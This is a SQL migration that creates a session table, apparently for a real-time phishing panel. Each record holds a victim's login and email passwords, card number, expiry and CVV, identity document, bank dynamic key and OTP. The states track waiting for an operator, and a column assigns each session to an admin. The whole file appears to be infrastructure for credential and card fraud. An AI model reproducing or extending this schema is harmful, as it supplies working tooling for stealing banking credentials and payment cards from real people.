-- CreateEnum
CREATE TYPE "SessionState" AS ENUM ('AUTH', 'AUTH_WAIT_ACTION', 'DINAMIC', 'DINAMIC_WAIT_ACTION', 'OTP', 'OTP_WAIT_ACTION', 'DONE', 'INIT');

-- CreateTable
CREATE TABLE "Session" (
    "id" TEXT NOT NULL,
    "state" "SessionState" NOT NULL DEFAULT 'AUTH',
    "ip" TEXT,
    "name" TEXT,
    "phone" TEXT,
    "email" TEXT,
    "emailPass" TEXT,
    "address" TEXT,
    "user" TEXT,
    "pass" TEXT,
    "cc" TEXT,
    "exp" TEXT,
    "cvv" TEXT,
    "document" TEXT,
    "country" TEXT,
    "city" TEXT,
    "dinamic" TEXT,
    "otp" TEXT,
    "assignedAdminId" TEXT,
    "lastError" TEXT,
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updatedAt" TIMESTAMP(3) NOT NULL,

    CONSTRAINT "Session_pkey" PRIMARY KEY ("id")
);

-- CreateIndex
CREATE INDEX "Session_state_idx" ON "Session"("state");

-- CreateIndex
CREATE INDEX "Session_updatedAt_idx" ON "Session"("updatedAt");
